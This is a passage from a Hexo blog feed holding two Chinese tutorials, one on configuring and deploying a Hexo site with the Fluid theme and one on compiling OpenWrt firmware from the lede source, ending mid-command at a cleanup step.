此处可不填，子标题</span><br><span class="hljs-attr">description:</span>                <span class="hljs-comment"># 此处可不填，网站简介</span><br><span class="hljs-attr">keywords:</span>                   <span class="hljs-comment"># 此处可不填，关键词</span><br><span class="hljs-attr">author:</span>                     <span class="hljs-comment"># 必填，作者名称</span><br><span class="hljs-attr">language:</span> <span class="hljs-string">zh-CN</span>             <span class="hljs-comment"># 必填，使用的语言，这里应填为 `zh-CN` </span><br><span class="hljs-attr">timezone:</span> <span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>   <span class="hljs-comment"># 必填，时区，在国内建议选择上海时间</span><br><br><span class="hljs-comment"># URL</span><br><span class="hljs-comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="hljs-attr">url:</span> <span class="hljs-string">https://&lt;你的</span> <span class="hljs-string">Github</span> <span class="hljs-string">用户名&gt;.github.io</span>  <span class="hljs-comment"># 必填，Github Page 的地址</span><br><span class="hljs-attr">permalink:</span> <span class="hljs-string">:year/:month/:day/:title/</span><br><span class="hljs-attr">permalink_defaults:</span><br><span class="hljs-attr">pretty_urls:</span><br>  <span class="hljs-attr">trailing_index:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span><br>  <span class="hljs-attr">trailing_html:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks</span><br></code></pre></td></tr></table></figure><ul><li>在项目目录下执行<code>hexo -g</code>将会生成网站静态文件，<code>hexo -s</code>则会打开本地服务器，此时即可访问<code>http://localhost:4000/</code>查看默认网站。</li></ul><h3 id="Hexo-Deploy-配置"><a href="#Hexo-Deploy-配置" class="headerlink" title="Hexo Deploy 配置"></a>Hexo Deploy 配置</h3><p>Hexo内置部署功能，可以很方便的部署到Github上去，并自动同步Github Page，首先安装<a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>具体需在 <code>_config.yml</code> 文件下找到并修改如下：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"># Deployment<br>## Docs: https:<span class="hljs-comment">//hexo.io/docs/one-command-deployment</span><br>deploy:<br>  type: git<br>  # 必填，Github 仓库地址<br>  repo: https:<span class="hljs-comment">//github.com/&lt;Github 用户名&gt;/&lt;Github 用户名&gt;.github.io.git </span><br>  branch: <span class="hljs-string">&#x27;master&#x27;</span>    # 决定上传到哪个节点下，这里默认选择 <span class="hljs-string">&#x27;main&#x27;</span><br>  token:            # Github认证Token<br></code></pre></td></tr></table></figure><p>字段功能如下表所示：</p><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">选项</td><td align="left">描述</td><td align="left">默认</td></tr><tr><td align="left"><code>repo</code></td><td align="left">目标存储库的 URL</td><td align="left"></td></tr><tr><td align="left"><code>branch</code></td><td align="left">分支名称</td><td align="left"><code>gh-pages</code> (GitHub) <code>coding-pages</code> (Coding.net) <code>master</code> (others)</td></tr><tr><td align="left"><code>message</code></td><td align="left">自定义提交信息</td><td align="left"><code>Site updated: &#123;&#123; now('YYYY-MM-DD HH:mm:ss') &#125;&#125;</code></td></tr><tr><td align="left"><code>token</code></td><td align="left">可选的令牌值，用于认证 repo。 用 <code>$</code> 作为前缀从而从环境变量中读取令牌</td><td align="left"></td></tr></tbody></table><p>配置完成后执行<code>hexo d</code>即可上传至Github。</p><h3 id="Hexo-安装主题"><a href="#Hexo-安装主题" class="headerlink" title="Hexo 安装主题"></a>Hexo 安装主题</h3><ul><li><p>接下来，我们给他换个主题，可以在 <em><a href="https://link.zhihu.com/?target=https://hexo.io/themes/">https://hexo.io/themes/</a></em> 上寻找想要的主题，我们这里以Fluid主题介绍安装步骤：</p><ul><li><p>进入博客目录执行命令安装</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure></li><li><p>在博客目录下创建<code>_config.fluid.yml</code>，将主题的 <a href="https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml">_config.yml (opens new window)</a>内容复制过去。</p></li><li><p>博客目录下的<code>_config.fluid.yml</code>文件</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theme:</span> fluid <span class="hljs-meta"># 请在此处修改主题名称，比如：fluid</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="Fluid-主题配置"><a href="#Fluid-主题配置" class="headerlink" title="Fluid 主题配置"></a>Fluid 主题配置</h3><p>​Fluid主题配置来源于Fluid用户手册，这里只记录了本人所用到一些配置，详细配置转到<a href="https://fluid-dev.github.io/hexo-fluid-docs/">Hexo Fludi用户手册</a>。</p><blockquote><p>​Fluid主题配置文件一般指<code>theme/fluid/_config.yml</code>或者<code>_config.fluid.yml</code>，其中<code>_config.fluid.yml</code>优先级比较高。初始配置可以在博客目录下创建<code>_config.fluid.yml</code>文件，将<a href="https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml">官方默认配置</a>复制进去即可。</p></blockquote><h4 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h4><h5 id="页面顶部大图"><a href="#页面顶部大图" class="headerlink" title="页面顶部大图"></a>页面顶部大图</h5><p>​主题配置中，每个页面都有名为 <code>banner_img</code> 的属性，可以使用本地图片的相对路径，也可以为外站链接：</p><p>本地图片：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">banner_img: <span class="hljs-regexp">/img/</span>bg<span class="hljs-regexp">/example.jpg   # 对应存放在 /</span><span class="hljs-keyword">source</span><span class="hljs-regexp">/img/</span>bg/example.jpg<br></code></pre></td></tr></table></figure><p>外部链接：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">banner_img:</span> https:<span class="hljs-comment">//static.zkqiang.cn/example.jpg</span><br></code></pre></td></tr></table></figure><h5 id="网页统计功能"><a href="#网页统计功能" class="headerlink" title="网页统计功能"></a>网页统计功能</h5><p>fluid支持多种网页统计方式，下面的选择一个，填写上key即可。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">web_analytics:</span>  <span class="hljs-meta"># 网页访问统计</span><br><span class="hljs-symbol">  enable:</span> true <span class="hljs-meta"># 默认为false，启用网页统计改为true即可</span><br><span class="hljs-symbol">  baidu:</span>  <span class="hljs-meta"># 百度统计的Key，参见 https:<span class="hljs-comment">//tongji.baidu.com/sc-web/10000033910/home/site/getjs?siteId=13751376 代码获取中 hm.js? 后边的字符串</span></span><br><span class="hljs-symbol">  google:</span>  <span class="hljs-meta"># Google统计的Tracking ID，参见 https:<span class="hljs-comment">//analytics.google.com/analytics/web/</span></span><br><span class="hljs-symbol">  tencent:</span>  <span class="hljs-meta"># 腾讯统计的H5 App id，参见 https:<span class="hljs-comment">//mta.qq.com/h5/manage/ctr_app_manage (开启高级功能才有cid)</span></span><br><span class="hljs-symbol">    sid:</span><br><span class="hljs-symbol">    cid:</span><br><span class="hljs-symbol">  woyaola:</span>  <span class="hljs-meta"># 51.la站点统计ID，参见 https:<span class="hljs-comment">//www.51.la/user/site/index</span></span><br><span class="hljs-symbol">  cnzz:</span>  <span class="hljs-meta"># 友盟/cnzz站点统计web_id，参见 https:<span class="hljs-comment">//web.umeng.com/main.php?c=site&amp;a=show</span></span><br><span class="hljs-symbol">  leancloud:</span>  <span class="hljs-meta"># LeanCloud 计数统计，可用于 PV UV 展示，如果 web_analytics.enable 没有开启，PV UV 展示只会查询，不会增加</span><br><span class="hljs-symbol">    app_id:</span><br><span class="hljs-symbol">    app_key:</span><br><span class="hljs-symbol">    server_url:</span>  <span class="hljs-meta"># REST API 服务器地址，国际版不填</span><br></code></pre></td></tr></table></figure><h5 id="展示-PV-与-UV-统计"><a href="#展示-PV-与-UV-统计" class="headerlink" title="展示 PV 与 UV 统计"></a>展示 PV 与 UV 统计</h5><p>​PV与UV可以展示当前站点总访问量，总访客数，busuanzi似乎已经凉了。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">footer:</span><br><span class="hljs-symbol">  statistics:</span><br><span class="hljs-symbol">    enable:</span> true<br><span class="hljs-symbol">    source:</span> <span class="hljs-string">&quot;busuanzi&quot;</span>  <span class="hljs-meta"># 可选 leancloud | busuanzi  根据自己需求选择</span><br><span class="hljs-symbol">    pv_format:</span> <span class="hljs-string">&quot;总访问量 &#123;&#125; 次&quot;</span>  <span class="hljs-meta"># 显示的文本，&#123;&#125;是数字的占位符（必须包含)，下同</span><br><span class="hljs-symbol">    uv_format:</span> <span class="hljs-string">&quot;总访客数 &#123;&#125; 人&quot;</span><br></code></pre></td></tr></table></figure><h4 id="文章相关配置"><a href="#文章相关配置" class="headerlink" title="文章相关配置"></a>文章相关配置</h4><h5 id="Front-matter"><a href="#Front-matter" class="headerlink" title="Front-matter"></a>Front-matter</h5><p>Front-matter 是文件开头的 YAML 或 JSON 代码块，用于配置写作设置。例如在博客MD文件开头，我们可以添加如下代码块指明文章基本信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">个人博客搭建</span><br><span class="hljs-attr">excerpt:</span> <span class="hljs-string">摘要</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2024</span><span class="hljs-string">/7/11</span> <span class="hljs-number">20</span><span class="hljs-string">:46:25</span><br><span class="hljs-attr">update:</span> <span class="hljs-number">2024</span><span class="hljs-string">/7/11</span> <span class="hljs-number">21</span><span class="hljs-string">:00:00</span><br><span class="hljs-attr">comments:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">tags:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">教程文档</span><br><span class="hljs-attr">categories:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">博客搭建</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">hexo</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>字段及解释如下：</p><table><thead><tr><th align="left">设置</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>layout</code></td><td align="left">布局</td><td align="left"><a href="https://hexo.io/docs/configuration#Writing"><code>config.default_layout</code></a></td></tr><tr><td align="left"><code>title</code></td><td align="left">标题</td><td align="left">文章的文件名</td></tr><tr><td align="left"><code>date</code></td><td align="left">建立日期</td><td align="left">文件建立日期</td></tr><tr><td align="left"><code>updated</code></td><td align="left">更新日期</td><td align="left">文件更新日期</td></tr><tr><td align="left"><code>comments</code></td><td align="left">开启文章的评论功能</td><td align="left"><code>true</code></td></tr><tr><td align="left"><code>tags</code></td><td align="left">标签（不适用于分页）</td><td align="left"></td></tr><tr><td align="left"><code>categories</code></td><td align="left">分类（不适用于分页）</td><td align="left"></td></tr><tr><td align="left"><code>permalink</code></td><td align="left">覆盖文章的永久链接. 永久链接应该以 <code>/</code> 或 <code>.html</code> 结尾</td><td align="left"><code>null</code></td></tr><tr><td align="left"><code>excerpt</code></td><td align="left">纯文本的页面摘要。 使用 <a href="https://hexo.io/zh-cn/docs/tag-plugins#%E6%96%87%E7%AB%A0%E6%91%98%E8%A6%81%E5%92%8C%E6%88%AA%E6%96%AD">该插件</a> 来格式化文本</td><td align="left"></td></tr><tr><td align="left"><code>disableNunjucks</code></td><td align="left">启用时禁用 Nunjucks 标签 <code>&#123;&#123; &#125;&#125;</code>&#x2F;<code>&#123;% %&#125;</code> 和 <a href="https://hexo.io/zh-cn/docs/tag-plugins">标签插件</a> 的渲染功能</td><td align="left">false</td></tr><tr><td align="left"><code>lang</code></td><td align="left">设置语言以覆盖 <a href="https://hexo.io/zh-cn/docs/internationalization#%E8%B7%AF%E5%BE%84">自动检测</a></td><td align="left">继承自 <code>_config.yml</code></td></tr><tr><td align="left"><code>published</code></td><td align="left">文章是否发布</td><td align="left">对于 <code>_posts</code> 下的文章为 <code>true</code>，对于 <code>_draft</code> 下的文章为 <code>false</code></td></tr></tbody></table><div class="note note-primary">            <p>值得注意的是分类和标签字段，在Hexo中，分类具有顺序性和层次性；而标签没有顺序和层次。在配置上需要注意，下面配置将为文章添加<code>Diary</code>和<code>Life</code>分类。</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">categories</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Diary</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Life</span><br></code></pre></td></tr></table></figure><p>如果需要为文章添加多个子分类，请使用以下列表格式，必须要添加<code>[]</code>，否则将会识别为层次格式：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">categories</span>:<br><span class="hljs-literal">-</span> [Diary, PlayStation]<br><span class="hljs-literal">-</span> [Diary, Games]<br><span class="hljs-literal">-</span> [Life]<br></code></pre></td></tr></table></figure>          </div><h5 id="首页滚动标题"><a href="#首页滚动标题" class="headerlink" title="首页滚动标题"></a>首页滚动标题</h5><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">index:</span><br><span class="hljs-symbol">  slogan:</span><br><span class="hljs-symbol">    enable:</span> true<br><span class="hljs-symbol">    text:</span> 这是一条 Slogan<br><span class="hljs-symbol">    api:</span><br><span class="hljs-symbol">      enable:</span> false<br><span class="hljs-symbol">      url:</span> <span class="hljs-string">&quot;https://v1.hitokoto.cn/&quot;</span><br><span class="hljs-symbol">      method:</span> <span class="hljs-string">&quot;GET&quot;</span><br><span class="hljs-symbol">      headers:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-symbol">      keys:</span> [<span class="hljs-string">&quot;hitokoto&quot;</span>]<br></code></pre></td></tr></table></figure><ul><li><p><code>api</code>字段可以指定首页标题内容来源</p><ul><li><p><code>url</code>: API 地址，必须返回的是一个 JSON 格式</p></li><li><p>method<code>: 请求方法，可选 </code>GET<code>、</code>POST<code>、</code>PUT</p></li><li><p><code>headers</code>: 请求头，如果接口需要传一些验证的头部信息，在这里设置</p></li><li><p><code>keys</code>指明从请求结果中获取名称，例如<code>[&#39;data&#39;,&#39;content&#39;]</code>表示获取json数据中<code>data</code>字段中的<code>content</code>值。</p></li></ul></li></ul><h5 id="文章摘要"><a href="#文章摘要" class="headerlink" title="文章摘要"></a>文章摘要</h5><p>  ​Fluid默认开启自动摘要：</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">index:</span><br>  <span class="hljs-attr">auto_excerpt:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>  也可以在MD文档中<code>Front-matter</code>手动指定摘要：</p>  <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">title:</span> 文章题目<br><span class="hljs-symbol">excerpt:</span> 文章摘要<br></code></pre></td></tr></table></figure><h5 id="日期-字数-阅读时长-阅读数"><a href="#日期-字数-阅读时长-阅读数" class="headerlink" title="日期&#x2F;字数&#x2F;阅读时长&#x2F;阅读数"></a>日期&#x2F;字数&#x2F;阅读时长&#x2F;阅读数</h5><p>  ​显示在文章页大标题下的文章信息，除了作者和阅读次数，其他功能都是默认开启的。</p>  <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">post:</span><br><span class="hljs-symbol">  meta:</span><br><span class="hljs-symbol">    author:</span>  <span class="hljs-meta"># 作者，优先根据 front-matter 里 author 字段，其次是 hexo 配置中 author 值</span><br><span class="hljs-symbol">      enable:</span> false<br><span class="hljs-symbol">    date:</span>  <span class="hljs-meta"># 文章日期，优先根据 front-matter 里 date 字段，其次是 md 文件日期</span><br><span class="hljs-symbol">      enable:</span> true<br><span class="hljs-symbol">      format:</span> <span class="hljs-string">&quot;dddd, MMMM Do YYYY, h:mm a&quot;</span>  <span class="hljs-meta"># 格式参照 ISO-8601 日期格式化</span><br><span class="hljs-symbol">    wordcount:</span>  <span class="hljs-meta"># 字数统计</span><br><span class="hljs-symbol">      enable:</span> true<br><span class="hljs-symbol">      format:</span> <span class="hljs-string">&quot;&#123;&#125; 字&quot;</span>  <span class="hljs-meta"># 显示的文本，&#123;&#125;是数字的占位符（必须包含)，下同</span><br><span class="hljs-symbol">    min2read:</span>  <span class="hljs-meta"># 阅读时间</span><br><span class="hljs-symbol">      enable:</span> true<br><span class="hljs-symbol">      format:</span> <span class="hljs-string">&quot;&#123;&#125; 分钟&quot;</span><br><span class="hljs-symbol">    views:</span>  <span class="hljs-meta"># 阅读次数</span><br><span class="hljs-symbol">      enable:</span> false<br><span class="hljs-symbol">      source:</span> <span class="hljs-string">&quot;leancloud&quot;</span>  <span class="hljs-meta"># 统计数据来源，可选：leancloud | busuanzi   注意不蒜子会间歇抽风</span><br><span class="hljs-symbol">      format:</span> <span class="hljs-string">&quot;&#123;&#125; 次&quot;</span><br></code></pre></td></tr></table></figure><h5 id="Tag插件"><a href="#Tag插件" class="headerlink" title="Tag插件"></a>Tag插件</h5><p>  在 markdown 中加入如下的代码来使用便签：</p>  <figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name">note</span> success %&#125;</span><span class="language-xml"></span><br><span class="language-xml">文字 或者 `markdown` 均可</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">endnote</span> %&#125;</span><br></code></pre></td></tr></table></figure><p>  <code>success</code>可更换为<code>primary</code>、<code>secondary</code>、<code>success</code>、<code>danger</code>、<code>warning</code>、<code>info</code>、<code>light</code>。</p>  <div class="note note-primary">            <p>我是便签。</p>          </div>  <div class="note note-secondary">            <p>我也是便签。</p>          </div>  <div class="note note-success">            <p>我还是便签。</p>          </div>  <div class="note note-danger">            <p>我当然是便签。</p>          </div>  <div class="note note-warning">            <p>我肯定是是便签。</p>          </div>  <div class="note note-warning">            <p>我不是便签吗？</p>          </div>  <div class="note note-light">            <p>我绝对是便签。</p>          </div>]]></content>
    
    
    <categories>
      
      <category>教程文档</category>
      
      <category>Hero</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Openwrt自编译教程</title>
    <link href="/2023/12/09/Guide/Openwrt%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/"/>
    <url>/2023/12/09/Guide/Openwrt%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="Openwrt自编译教程"><a href="#Openwrt自编译教程" class="headerlink" title="Openwrt自编译教程"></a>Openwrt自编译教程</h2><h3 id="安装编译环境"><a href="#安装编译环境" class="headerlink" title="安装编译环境"></a>安装编译环境</h3><p><strong>安装依赖</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt update -y<br>sudo apt full-upgrade -y<br>sudo apt <span class="hljs-keyword">install </span>-y ack antlr3 asciidoc autoconf automake autopoint <span class="hljs-keyword">binutils </span><span class="hljs-keyword">bison </span><span class="hljs-keyword">build-essential </span>\<br><span class="hljs-keyword">bzip2 </span>ccache cmake cpio curl device-tree-compiler fastjar flex gawk gettext gcc-<span class="hljs-keyword">multilib </span>g++-<span class="hljs-keyword">multilib </span>\<br>git gperf haveged help2man intltool libc6-dev-i386 libelf-dev libglib2.<span class="hljs-number">0</span>-dev libgmp3-dev libltdl-dev \<br>libmpc-dev libmpfr-dev libncurses5-dev libncursesw5-dev libreadline-dev libssl-dev libtool lrzsz \<br>msmtp nano ninja-<span class="hljs-keyword">build </span>p7zip p7zip-full patch pkgconf python3 python3-pyelftools \<br>libpython3-dev qemu-utils rsync <span class="hljs-keyword">scons </span>squashfs-tools <span class="hljs-keyword">subversion </span><span class="hljs-keyword">swig </span>texinfo uglifyjs unzip \<br>vim wget xmlto xxd zlib1g-dev python3-setuptools libgsl-dev\<br>nodejs python2.<span class="hljs-number">7</span> upx-ucl mkisofs libtinfo5<br></code></pre></td></tr></table></figure><p><strong>下载源码</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/coolsnowwolf/lede<br></code></pre></td></tr></table></figure><h3 id="常见文件说明"><a href="#常见文件说明" class="headerlink" title="常见文件说明"></a>常见文件说明</h3><p><strong>feeds.conf.default文件</strong></p><p>此文件记录了插件包所在的源，我们可以在里面加入自己的源。<br>        网上有很多朋友整理了一些常用插件包，可以在此处直接添加，也可以根据自己的需求，自己建立一下git仓库，里面存放自己用到的插件包。</p><p>例如，我们可以使用以下命令添加常用软件包</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sed -<span class="hljs-selector-tag">i</span> <span class="hljs-string">&#x27;$a src-git kenzo https://github.com/kenzok8/openwrt-packages&#x27;</span> feeds<span class="hljs-selector-class">.conf</span><span class="hljs-selector-class">.default</span><br>sed -<span class="hljs-selector-tag">i</span> <span class="hljs-string">&#x27;$a src-git small https://github.com/kenzok8/small&#x27;</span> feeds<span class="hljs-selector-class">.conf</span><span class="hljs-selector-class">.default</span><br>git pull<br>./scripts/feeds update -<span class="hljs-selector-tag">a</span><br>./scripts/feeds install -<span class="hljs-selector-tag">a</span><br>make menuconfig<br></code></pre></td></tr></table></figure><h3 id="常见配置说明"><a href="#常见配置说明" class="headerlink" title="常见配置说明"></a>常见配置说明</h3><p>使用<code>make menuconfig</code>可进入图形界面版本的配置管理器。</p><p><img src="https://img-blog.csdnimg.cn/direct/ab765551c0304539b3b33cb44cd37635.png" alt="image-20230801135132323"></p><p>下面我们详细介绍一下各个配置选项：</p><ul><li><p><code>Target System</code></p><p>选择处理器架构。该配置对应<code>target/linux</code>下的各个目录，目录名称对应cpu架构。</p></li><li><p><code>Subtarget</code></p><p>平台子选项</p></li><li><p><code>Target Profile</code></p><p>选择具体路由器型号，该配置对应<code>target/linux</code>下的各个目录下不同系列cou对应芯片的<code>.dtsi</code>和对应的<code>.dts</code>文件，但也可以通过增加或修改<code>dts</code>文件增加或修改选项。</p></li><li><p><code>Target Images</code></p><p>固件包打包格式</p></li><li><p><code>Base System</code></p><ul><li><p><code>blocd</code></p><p>自动挂载块设备，通常选上，挂载磁盘用。</p></li></ul></li><li><p><code>Luci</code></p><p>插件配置基本上都在此，正常情况下进入应该有很多个选项。</p><p><img src="https://img-blog.csdnimg.cn/direct/96764b0fa3284eb69bc0f69b1f9f629a.png" alt="image-20230801144508106">如果出现出现只有一项子选项情况，那是可能因为没有更新软包，执行以下命令更新软件包即可。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/scripts/</span>feeds update -a<br>.<span class="hljs-regexp">/scripts/</span>feeds install -a<br></code></pre></td></tr></table></figure><ul><li><p><code>Collections</code></p><p>默认选择<code>luci</code>，其他可根据自己需要选择。</p></li><li><p><code>Modules</code></p><ul><li><code>Translations</code>：选择页面语言</li></ul></li><li><p><code>Applications</code></p><p>插件选项，通常我们添加的插件都在此目录，选择自己需要的插件即可。</p></li><li><p><code>Themes</code></p><p>​<code>luci</code>主题选项</p></li></ul></li></ul><h3 id="首次编译"><a href="#首次编译" class="headerlink" title="首次编译"></a>首次编译</h3><ul><li><p><code>make -j8 download V=s</code> 下载dl库（国内请尽量做好软件源加速）</p></li><li><p><code>find dl -size -1024c -exec ls -l &#123;&#125; \;</code>此命令可以列出下载不完整的文件得出小于1k的文件属于下载不完整），如果存在这样的文件可以使用<code>find dl -size -1024c -exec rm -f &#123;&#125; \;</code>命令将它们删除，然后重新执行<code>make download</code>下载并反复检查，确认所有文件完整可大大提高编译成功率，避免浪费时间。</p></li><li><p>输入 <code>make -j1 V=s</code> （<code>-j1</code> 后面数字<code>1</code>是线程数。第一次编译推荐用单线程）进行编译你要的固件。</p><p><strong>编译完成后固件保存在 <code>./bin/targets/</code> 文件夹内。</strong></p></li></ul><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> -j8 download V=s &amp;&amp; <span class="hljs-built_in">make</span> -j$(nproc) || <span class="hljs-built_in">make</span> -j1 || <span class="hljs-built_in">make</span> -j1 V=s<br></code></pre></td></tr></table></figure><h3 id="二次编译"><a href="#二次编译" class="headerlink" title="二次编译"></a>二次编译</h3><p><strong>更新本地编译环境</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更新软件列表、升级软件包</span><br><span class="hljs-built_in">sudo</span> sh -c <span class="hljs-string">&quot;apt update &amp;&amp; apt upgrade -y&quot;</span><br><br><span class="hljs-comment"># 拉取最新源码</span><br><span class="hljs-built_in">cd</span> ~/openwrt &amp;&amp; git pull<br><br><span class="hljs-comment"># 更新下载安装订阅源包含的软件包</span><br><span class="hljs-built_in">cd</span> ~/openwrt<br>./scripts/feeds update -a &amp;&amp; ./scripts/feeds install -a<br></code></pre></td></tr></table></figure><p><strong>清除旧的编译产物</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make clean</span><br></code></pre></td></tr></table></figure><blockquote><p>  在源码有大规模更新或者内核更新后执行，以保证编译质量。此操作会删除<code>/bin</code>和<code>/build_dir</code>目录中的文件。</p></blockquote><p><strong>清除旧的编译产物、交叉编译工具及工具链等目录</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make dirclean</span><br></code></pre></td></tr></table></figure><blockquote><p>  更换架构编译前必须执行。此操作会删除<code>/staging_dir</code>、<code>/toolchain</code>、<code>/tmp</code>和<code>/logs</code>中的文件。</p></blockquote><p><strong>清除临时文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf 